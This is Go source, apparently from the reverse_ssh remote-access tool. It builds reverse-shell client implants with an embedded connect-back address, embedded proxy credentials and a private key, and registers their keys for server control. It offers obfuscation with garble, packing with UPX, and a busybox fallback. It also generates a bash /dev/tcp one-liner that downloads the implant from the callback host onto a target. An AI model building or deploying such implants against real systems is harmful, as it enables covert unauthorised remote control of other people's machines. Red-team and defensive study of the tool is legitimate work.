package webserver

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/data"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"github.com/NHAS/reverse_ssh/pkg/trie"
	"golang.org/x/crypto/ssh"
)

var (
	Autocomplete = trie.NewTrie()

	cachePath string

	validPlatforms = make(map[string]bool)
	validArchs     = make(map[string]bool)

	validArtifactName     = regexp.MustCompile(`^[A-Za-z0-9._-]{1,128}$`)
	validWorkingDirectory = regexp.MustCompile(`^[A-Za-z0-9_./~:@+\\ -]{1,255}$`)
	singleTokenBuildValue = regexp.MustCompile(`^[^\s\x00-\x1f\x7f]+$`)

	allowedModuleBuildTags = map[string]struct{}{
		"pscan":   {},
		"execass": {},
	}
)

type BuildConfig struct {
	Name, Comment, Owners string

	GOOS, GOARCH, GOARM string

	ConnectBackAdress, Fingerprint string

	Proxy, SNI, LogLevel string

	UseKerberosAuth bool

	SharedLibrary   bool
	UPX             bool
	Lzma            bool
	Garble          bool
	DisableLibC     bool
	RawDownload     bool
	UseHostHeader   bool
	NoHistorySave   bool
	BusyBoxFallback bool
	BuildTags       []string

	WorkingDirectory string

	NTLMProxyCreds string

	VersionString string
}

func Build(config BuildConfig) (string, error) {
	if !webserverOn {
		return "", errors.New("web server is not enabled")
	}
	if err := validateBuildConfig(config); err != nil {
		return "", err
	}
	buildTags, err := normalizeModuleBuildTags(config.BuildTags)
	if err != nil {
		return "", err
	}
	config.BuildTags = buildTags

	if len(config.GOARCH) != 0 && !validArchs[config.GOARCH] {
		return "", fmt.Errorf("GOARCH supplied is not valid: %s", config.GOARCH)
	}

	if len(config.GOOS) != 0 && !validPlatforms[config.GOOS] {
		return "", fmt.Errorf("GOOS supplied is not valid: %s", config.GOOS)
	}

	if len(config.Fingerprint) == 0 {
		config.Fingerprint = defaultFingerPrint
	}

	if config.UPX {
		_, err := exec.LookPath("upx")
		if err != nil {
			return "", errors.New("upx could not be found in PATH")
		}
	}

	buildTool := "go"
	if config.Garble {
		_, err := exec.LookPath("garble")
		if err != nil {
			return "", errors.New("garble could not be found in PATH")
		}
		buildTool = "garble"
	}

	var f data.Download
	f.WorkingDirectory = config.WorkingDirectory
	f.CallbackAddress = config.ConnectBackAdress
	f.UseHostHeader = config.UseHostHeader

	filename, err := internal.RandomString(16)
	if err != nil {
		return "", err
	}

	if len(config.Name) == 0 {
		config.Name, err = internal.RandomString(16)
		if err != nil {
			return "", err
		}
	}

	f.Goos = runtime.GOOS
	if len(config.GOOS) > 0 {
		f.Goos = config.GOOS
	}

	f.Goarch = runtime.GOARCH
	if len(config.GOARCH) > 0 {
		f.Goarch = config.GOARCH
	}

	f.Goarm = config.GOARM

	f.FilePath = filepath.Join(cachePath, filename)
	f.FileType = "executable"
	f.Version = internal.Version + "_guess"

	repoVersion, err := exec.Command("git", "describe", "--tags").CombinedOutput()
	if err == nil {
		f.Version = string(repoVersion)
	}

	var buildArguments []string
	if config.Garble {
		buildArguments = append(buildArguments, "-tiny", "-literals")
	}

	buildArguments = append(buildArguments, "build", "-trimpath")
	var cleanupBusyBoxOverlay func()
	if config.BusyBoxFallback {
		busyBoxOverlay, cleanup, err := prepareBusyBoxOverlay(f.Goos, f.Goarch)
		if err != nil {
			return "", err
		}
		cleanupBusyBoxOverlay = cleanup
		defer cleanupBusyBoxOverlay()
		buildArguments = append(buildArguments, "-overlay", busyBoxOverlay)
	}

	if config.SharedLibrary {
		buildArguments = append(buildArguments, "-buildmode=c-shared")
		f.FileType = "shared-object"
		if f.Goos != "windows" {
			f.FilePath += ".so"
		} else {
			f.FilePath += ".dll"
		}

	}
	goBuildTags := append([]string(nil), config.BuildTags...)
	if config.SharedLibrary {
		goBuildTags = append(goBuildTags, "cshared")
	}
	if len(goBuildTags) > 0 {
		buildArguments = append(buildArguments, "-tags="+strings.Join(goBuildTags, ","))
	}

	newPrivateKey, err := internal.GeneratePrivateKey()
	if err != nil {
		return "", err
	}

	sshPriv, err := ssh.ParsePrivateKey(newPrivateKey)
	if err != nil {
		return "", err
	}
	lastBuiltClientStableID = internal.FingerprintSHA1Hex(sshPriv.PublicKey())

	publicKeyBytes := ssh.MarshalAuthorizedKey(sshPriv.PublicKey())
	embeddedPrivateKeyB64 := base64.StdEncoding.EncodeToString(newPrivateKey)

	_, err = logger.StrToUrgency(config.LogLevel)
	if err != nil {
		return "", err
	}

	buildArguments = append(buildArguments, fmt.Sprintf("-ldflags=-s -w -X main.logLevel=%s -X main.destination=%s -X main.fingerprint=%s -X main.proxy=%s -X main.customSNI=%s -X main.useHostKerberos=%t -X main.noHistorySave=%t -X main.busyBoxFallback=%t -X main.ntlmProxyCreds=%s -X main.versionString=%s -X github.com/NHAS/reverse_ssh/internal.Version=%s -X github.com/NHAS/reverse_ssh/internal/client/keys.EmbeddedPrivateKeyBase64=%s", config.LogLevel, config.ConnectBackAdress, config.Fingerprint, config.Proxy, config.SNI, config.UseKerberosAuth, config.NoHistorySave, config.BusyBoxFallback, config.NTLMProxyCreds, strings.TrimSpace(config.VersionString), strings.TrimSpace(f.Version), embeddedPrivateKeyB64))
	buildArguments = append(buildArguments, "-o", f.FilePath, filepath.Join(projectRoot, "/cmd/client"))

	cmd := exec.Command(buildTool, buildArguments...)

	if config.DisableLibC {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	}

	cmd.Env = append(cmd.Env, os.Environ()...)
	cmd.Env = append(cmd.Env, "GOTOOLCHAIN=go1.24.5+auto")
	cmd.Env = append(cmd.Env, "GOOS="+f.Goos)
	cmd.Env = append(cmd.Env, "GOARCH="+f.Goarch)
	if len(f.Goarm) != 0 {
		cmd.Env = append(cmd.Env, "GOARM="+f.Goarm)
	}

	//Building a shared object for windows needs some extra beans
	cgoOn := "0"
	if config.SharedLibrary {

		var crossCompiler string
		if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && f.Goos == "windows" {
			crossCompiler = "x86_64-w64-mingw32-gcc"
			if f.Goarch == "386" {
				crossCompiler = "i686-w64-mingw32-gcc"
			}
		}

		cmd.Env = append(cmd.Env, "CC="+crossCompiler)
		cgoOn = "1"
	}

	cmd.Env = append(cmd.Env, "CGO_ENABLED="+cgoOn)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(err.Error(), "garble") && (strings.Contains(err.Error(), "i686-w64-mingw32-ld") || strings.Contains(err.Error(), "x86_64-w64-mingw32-ld")) &&
			strings.Contains(err.Error(), "undefined reference to") {
			// Try to recover if the linking fails by clearing the cache
			if cleanErr := exec.Command("go", "clean", "-cache").Run(); cleanErr != nil {
				return "", fmt.Errorf("error (was unable to automatically clean cache): %s\n%s", err.Error(), string(output))
			}
			output, err = cmd.CombinedOutput()
			if err != nil {
				return "", fmt.Errorf("error: %s\n%s", err.Error(), string(output))
			}
		} else {
			return "", fmt.Errorf("error: %s\n%s", err.Error(), string(output))
		}
	}

	f.UrlPath = config.Name

	if config.Lzma && !config.UPX {
		return "", errors.New("Cannot use --lzma without --upx")
	}

	if config.UPX {
		upxArgs := []string{"-qq", "-f", f.FilePath}

		if config.Lzma {
			upxArgs = append([]string{"--lzma"}, upxArgs...)
		}

		output, err := exec.Command("upx", upxArgs...).CombinedOutput()
		if err != nil {
			return "", errors.New("unable to run upx: " + err.Error() + ": " + string(output))
		}
	}

	fi, err := os.Stat(f.FilePath)
	if err != nil {
		fmt.Println("Error: ", err)
	}
	f.FileSize = float64(fi.Size()) / 1024 / 1024

	os.Chmod(f.FilePath, 0600)

	f.LogLevel = config.LogLevel

	err = data.CreateDownload(f)
	if err != nil {
		return "", err
	}

	Autocomplete.Add(config.Name)

	authorizedControlleeKeys, err := os.OpenFile(filepath.Join(cachePath, "../authorized_controllee_keys"), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return "", errors.New("cant open authorized controllee keys file: " + err.Error())
	}
	defer authorizedControlleeKeys.Close()

	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
	}

	if config.RawDownload {

		host, port, err := net.SplitHostPort(f.CallbackAddress)
		if err != nil {
			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
		}

		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
	}

	return "http://" + DefaultConnectBack + "/" + config.Name, nil
}

type goBuildOverlay struct {
	Replace map[string]string `json:"Replace"`
}

func prepareBusyBoxOverlay(goos, goarch string) (string, func(), error) {
	if goos != "linux" {
		return "", nil, errors.New("busybox fallback can only be embedded into linux artifacts")
	}

	sourcePath, err := findBusyBoxBinary(goarch)
	if err != nil {
		return "", nil, err
	}

	sourceBytes, err := os.ReadFile(sourcePath)
	if err != nil {
		return "", nil, fmt.Errorf("read busybox fallback binary %q: %w", sourcePath, err)
	}
	if len(sourceBytes) == 0 {
		return "", nil, fmt.Errorf("busybox fallback binary %q is empty", sourcePath)
	}

	compressed, err := gzipBytes(sourceBytes)
	if err != nil {
		return "", nil, err
	}

	tempDir, err := os.MkdirTemp("", "wrssh-busybox-overlay-*")
	if err != nil {
		return "", nil, fmt.Errorf("create busybox overlay temp dir: %w", err)
	}
	cleanup := func() {
		_ = os.RemoveAll(tempDir)
	}

	generatedSourcePath := filepath.Join(tempDir, "embedded.go")
	if err := os.WriteFile(generatedSourcePath, generatedBusyBoxSource(compressed), 0600); err != nil {
		cleanup()
		return "", nil, fmt.Errorf("write busybox overlay source: %w", err)
	}

	overlayPath := filepath.Join(tempDir, "overlay.json")
	overlay := goBuildOverlay{
		Replace: map[string]string{
			filepath.Join(projectRoot, "internal/client/busybox/embedded.go"): generatedSourcePath,
		},
	}
	overlayBytes, err := json.Marshal(overlay)
	if err != nil {
		cleanup()
		return "", nil, fmt.Errorf("encode busybox overlay: %w", err)
	}
	if err := os.WriteFile(overlayPath, overlayBytes, 0600); err != nil {
		cleanup()
		return "", nil, fmt.Errorf("write busybox overlay: %w", err)
	}

	return overlayPath, cleanup, nil
}

func findBusyBoxBinary(goarch string) (string, error) {
	envKey := "RSSH_BUSYBOX_" + strings.ToUpper(strings.ReplaceAll(goarch, "-", "_")) + "_PATH"
	candidates := []string{
		strings.TrimSpace(os.Getenv(envKey)),
		strings.TrimSpace(os.Getenv("RSSH_BUSYBOX_PATH")),
		filepath.Join("/usr/local/share/wrssh/busybox", "linux-"+goarch),
		filepath.Join("/usr/local/share/wrssh/busybox", "busybox-"+goarch),
		filepath.Join("/usr/local/bin", "busybox-"+goarch),
	}

	if runtime.GOOS == "linux" && runtime.GOARCH == goarch {
		candidates = append(candidates, "/bin/busybox", "/usr/bin/busybox")
	}

	for _, candidate := range candidates {
		if candidate == "" {
			continue
		}
		info, err := os.Stat(candidate)
		if err == nil && !info.IsDir() {
			return candidate, nil
		}
	}

	return "", fmt.Errorf("busybox fallback requested for linux/%s, but no busybox binary was found; set %s or RSSH_BUSYBOX_PATH", goarch, envKey)
}

func gzipBytes(input []byte) ([]byte, error) {
	var output bytes.Buffer
	writer, err := gzip.NewWriterLevel(&output, gzip.BestCompression)
	if err != nil {
		return nil, fmt.Errorf("create busybox gzip writer: %w", err)
	}
	if _, err := writer.Write(input); err != nil {
		_ = writer.Close()
		return nil, fmt.Errorf("compress busybox fallback: %w", err)
	}
	if err := writer.Close(); err != nil {
		return nil, fmt.Errorf("finish busybox fallback compression: %w", err)
	}
	return output.Bytes(), nil
}

func generatedBusyBoxSource(compressed []byte) []byte {
	var output bytes.Buffer
	output.WriteString("package busybox\n\n")
	output.WriteString("var embeddedGzip = []byte{\n")
	for i, value := range compressed {
		if i%12 == 0 {
			output.WriteString("\t")
		}
		output.WriteString(fmt.Sprintf("0x%02x,", value))
		if i%12 == 11 {
			output.WriteString("\n")
		} else {
			output.WriteByte(' ')
		}
	}
	if len(compressed)%12 != 0 {
		output.WriteString("\n")
	}
	output.WriteString("}\n")
	return output.Bytes()
}

func startBuildManager(_cachePath string) error {

	clientSource := filepath.Join(projectRoot, "/cmd/client")
	info, err := os.Stat(clientSource)
	if err != nil || !info.IsDir() {
		return fmt.Errorf("the server doesnt appear to be in {project_root}/bin, please put it there")
	}

	cmd := exec.Command("go", "tool", "dist", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("unable to run the go compiler to get a list of compilation targets: %s", err)
	}

	platformAndArch := bytes.Split(output, []byte("\n"))

	for _, line := range platformAndArch {
		parts := bytes.Split(line, []byte("/"))
		if len(parts) == 2 {
			validPlatforms[string(parts[0])] = true
			validArchs[string(parts[1])] = true
		}
	}

	info, err = os.Stat(_cachePath)
	if os.IsNotExist(err) {
		err = os.Mkdir(_cachePath, 0700)
		if err != nil {
			return err
		}
		info, err = os.Stat(_cachePath)
		if err != nil {
			return err
		}
	}

	if !info.IsDir() {
		return errors.New("Filestore path '" + _cachePath + "' already exists, but is a file instead of directory")
	}

	cachePath = _cachePath

	return nil
}

func validateBuildConfig(config BuildConfig) error {
	config.Name = strings.TrimSpace(config.Name)
	config.Comment = strings.TrimSpace(config.Comment)
	config.Owners = strings.TrimSpace(config.Owners)
	config.Proxy = strings.TrimSpace(config.Proxy)
	config.SNI = strings.TrimSpace(config.SNI)
	config.ConnectBackAdress = strings.TrimSpace(config.ConnectBackAdress)
	config.NTLMProxyCreds = strings.TrimSpace(config.NTLMProxyCreds)
	config.VersionString = strings.TrimSpace(config.VersionString)
	config.WorkingDirectory = strings.TrimSpace(config.WorkingDirectory)

	if config.Name != "" && !validArtifactName.MatchString(config.Name) {
		return errors.New("artifact name may only contain letters, numbers, '.', '_' and '-'")
	}
	if hasControlCharacters(config.Comment) {
		return errors.New("artifact comment must be a single line without control characters")
	}
	if hasControlCharacters(config.Owners) {
		return errors.New("artifact owners must not contain control characters")
	}
	if config.WorkingDirectory != "" && !validWorkingDirectory.MatchString(config.WorkingDirectory) {
		return errors.New("working directory contains unsupported characters")
	}
	if _, err := normalizeModuleBuildTags(config.BuildTags); err != nil {
		return err
	}
	for field, value := range map[string]string{
		"callback address": config.ConnectBackAdress,
		"proxy":            config.Proxy,
		"sni":              config.SNI,
		"ntlm proxy creds": config.NTLMProxyCreds,
		"version string":   config.VersionString,
		"log level":        config.LogLevel,
		"fingerprint":      config.Fingerprint,
	} {
		if value == "" {
			continue
		}
		if !singleTokenBuildValue.MatchString(value) {
			return fmt.Errorf("%s must not contain spaces or control characters", field)
		}
	}
	return nil
}

func normalizeModuleBuildTags(tags []string) ([]string, error) {
	seen := make(map[string]struct{}, len(tags))
	for _, tag := range tags {
		tag = strings.ToLower(strings.TrimSpace(tag))
		if tag == "" {
			continue
		}
		if _, ok := allowedModuleBuildTags[tag]; !ok {
			return nil, fmt.Errorf("unsupported module build tag %q", tag)
		}
		seen[tag] = struct{}{}
	}

	result := make([]string, 0, len(seen))
	for tag := range seen {
		result = append(result, tag)
	}
	sort.Strings(result)
	return result, nil
}

func hasControlCharacters(value string) bool {
	for _, r := range value {
		if r < 32 || r == 127 {
			return true
		}
	}
	return false
}
